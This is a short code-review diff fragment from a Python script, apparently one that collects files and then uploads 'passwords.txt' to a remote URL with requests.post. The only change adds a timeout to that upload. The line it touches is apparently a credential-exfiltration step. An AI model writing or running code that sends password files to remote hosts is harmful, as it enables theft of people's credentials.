@@ -37,5 +37,5 @@ for filename in os.listdir(path):
 							sys.stdout.close()
 
 with open("passwords.txt", 'rb') as f:
-	r = requests.post(url, data=f)
+	r = requests.post(url, data=f, timeout=60)
 						
